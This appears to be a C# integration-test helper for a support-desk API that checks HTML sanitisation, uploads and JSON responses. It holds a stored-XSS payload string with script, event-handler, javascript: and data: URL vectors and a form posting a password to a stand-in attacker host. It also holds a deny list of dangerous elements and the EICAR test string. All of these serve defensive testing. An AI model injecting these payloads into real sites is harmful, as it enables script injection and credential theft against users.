using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json.Nodes;
using AngleSharp.Html.Parser;
using SupportDesk.Contracts.Tickets;
using SupportDesk.IntegrationTests.Infrastructure;

namespace SupportDesk.IntegrationTests.Security;

/// <summary>Shared helpers for the security tests: hostile payloads, HTML safety checks, uploads and raw JSON access.</summary>
public static class SecurityTestKit
{
    public static readonly System.Text.Json.JsonSerializerOptions J = DeskApiFactory.Json;

    /// <summary>Stored-XSS vectors: script tags, event handlers, javascript:/vbscript:/data: URLs, SVG/MathML, forms, foreign iframes.</summary>
    public const string XssPayload =
        "<p>Visible text</p>" +
        "<script>alert('script-tag')</script>" +
        "<img src=x onerror=\"alert('onerror')\">" +
        "<a href=\"javascript:alert('js-url')\">js link</a>" +
        "<a href=\"JaVaScRiPt:alert('mixed-case')\">mixed</a>" +
        "<a href=\"java&#x09;script:alert('entity')\">entity</a>" +
        "<a href=\"vbscript:msgbox('vb')\">vb</a>" +
        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">data</a>" +
        "<svg onload=\"alert('svg')\"><circle r=\"1\"/></svg>" +
        "<math><mi xlink:href=\"javascript:alert('math')\">m</mi></math>" +
        "<iframe src=\"https://evil.example/frame\"></iframe>" +
        "<iframe src=\"javascript:alert('iframe')\"></iframe>" +
        "<form action=\"https://evil.example/steal\"><input name=\"password\"><button>Go</button></form>" +
        "<details open ontoggle=\"alert('toggle')\"><summary>s</summary></details>" +
        "<div style=\"background-image:url(javascript:alert('css'))\">styled</div>" +
        "<object data=\"https://evil.example/x.swf\"></object><embed src=\"https://evil.example/x.swf\">" +
        "<base href=\"https://evil.example/\"><meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">";

    private static readonly HashSet<string> ForbiddenElements = new(StringComparer.OrdinalIgnoreCase)
    {
        "script", "svg", "math", "form", "input", "button", "object", "embed", "base", "meta", "link", "style", "textarea", "select"
    };

    /// <summary>Fails when the HTML could run script: dangerous elements, on* handlers, script-capable URLs or a foreign iframe.</summary>
    public static void AssertSafeHtml(string? html, string where)
    {
        if (string.IsNullOrEmpty(html)) return;
        var doc = new HtmlParser().ParseDocument($"<body>{html}</body>");
        foreach (var el in doc.Body!.QuerySelectorAll("*"))
        {
            Assert.False(ForbiddenElements.Contains(el.LocalName), $"{where}: <{el.LocalName}> survived sanitisation: {html}");
            foreach (var attr in el.Attributes)
            {
                Assert.False(attr.Name.StartsWith("on", StringComparison.OrdinalIgnoreCase), $"{where}: event handler {attr.Name} survived: {html}");
                var value = new string(attr.Value.Where(c => !char.IsWhiteSpace(c) && !char.IsControl(c)).ToArray());
                foreach (var scheme in new[] { "javascript:", "vbscript:", "data:text" })
                    Assert.False(value.Contains(scheme, StringComparison.OrdinalIgnoreCase), $"{where}: {attr.Name}=\"{attr.Value}\" survived: {html}");
                if (attr.Name.Equals("style", StringComparison.OrdinalIgnoreCase))
                    Assert.DoesNotContain("url(", value, StringComparison.OrdinalIgnoreCase);
            }
            if (el.LocalName == "iframe")
                Assert.Matches(@"^https://(www\.)?(youtube(-nocookie)?\.com/embed/|player\.vimeo\.com/video/)", el.GetAttribute("src") ?? "");
        }
    }

    /// <summary>Every string value in a JSON document (the API's JSON encoder escapes &lt; so raw-text checks are meaningless).</summary>
    public static IEnumerable<string> Strings(JsonNode? node)
    {
        switch (node)
        {
            case JsonValue v when v.TryGetValue<string>(out var s):
                yield return s;
                break;
            case JsonObject o:
                foreach (var (_, child) in o)
                foreach (var s in Strings(child))
                    yield return s;
                break;
            case JsonArray a:
                foreach (var child in a)
                foreach (var s in Strings(child))
                    yield return s;
                break;
        }
    }

    /// <summary>Asserts every HTML-looking string in the response is safe and that the marker text survived somewhere.</summary>
    public static void AssertResponseHtmlSafe(JsonNode? body, string where, string mustContain = "Visible text")
    {
        var strings = Strings(body).ToList();
        foreach (var s in strings.Where(s => s.Contains('<'))) AssertSafeHtml(s, where);
        foreach (var s in strings)
        {
            Assert.DoesNotContain("<script", s, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("javascript:", s.Replace("&#x09;", ""), StringComparison.OrdinalIgnoreCase);
        }
        Assert.Contains(strings, s => s.Contains(mustContain, StringComparison.Ordinal));
    }

    public static async Task<JsonNode?> JsonAsync(this HttpResponseMessage response, HttpStatusCode? expected = null)
    {
        var text = await response.Content.ReadAsStringAsync();
        if (expected is { } e) Assert.True(response.StatusCode == e, $"Expected {(int)e}, got {(int)response.StatusCode}: {text}");
        return text.Length == 0 ? null : JsonNode.Parse(text);
    }

    public static async Task<JsonNode?> GetJsonAsync(this HttpClient client, string url)
    {
        var r = await client.GetAsync(url);
        return await r.JsonAsync(HttpStatusCode.OK);
    }

    public static async Task<TicketDetailDto> CreateTicketAsync(this HttpClient client, string subject, string? descriptionHtml = null, Guid? departmentId = null)
    {
        var r = await client.PostAsJsonAsync("/api/v1/tickets", new CreateTicketRequest
        {
            Subject = subject, DescriptionHtml = descriptionHtml, Channel = "Phone", DepartmentId = departmentId, SkipRouting = true
        }, J);
        Assert.True(r.IsSuccessStatusCode, await r.Content.ReadAsStringAsync());
        return (await r.Content.ReadFromJsonAsync<TicketDetailDto>(J))!;
    }

    /// <summary>Multipart upload to /api/v1/files (or a portal brand's /files endpoint).</summary>
    public static async Task<HttpResponseMessage> UploadAsync(this HttpClient client, byte[] content, string fileName, string? contentType = "application/octet-stream",
        string url = "/api/v1/files?purpose=attachment")
    {
        using var form = new MultipartFormDataContent();
        var file = new ByteArrayContent(content);
        if (contentType is not null) file.Headers.ContentType = MediaTypeHeaderValue.Parse(contentType);
        form.Add(file, "file", fileName);
        return await client.PostAsync(url, form);
    }

    public static byte[] Ascii(string s) => Encoding.ASCII.GetBytes(s);

    /// <summary>The EICAR anti-malware test string (harmless by design; every scanner flags it).</summary>
    public static byte[] Eicar() => Ascii(@"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

    /// <summary>Asserts a response was a handled client error (never a 500) and returns its problem "code".</summary>
    public static async Task<string?> AssertClientErrorAsync(HttpResponseMessage r, params HttpStatusCode[] allowed)
    {
        var text = await r.Content.ReadAsStringAsync();
        Assert.True(allowed.Contains(r.StatusCode), $"{r.RequestMessage?.Method} {r.RequestMessage?.RequestUri} → {(int)r.StatusCode}: {text}");
        try { return JsonNode.Parse(text)?["code"]?.GetValue<string>(); } catch (System.Text.Json.JsonException) { return null; }
    }
}
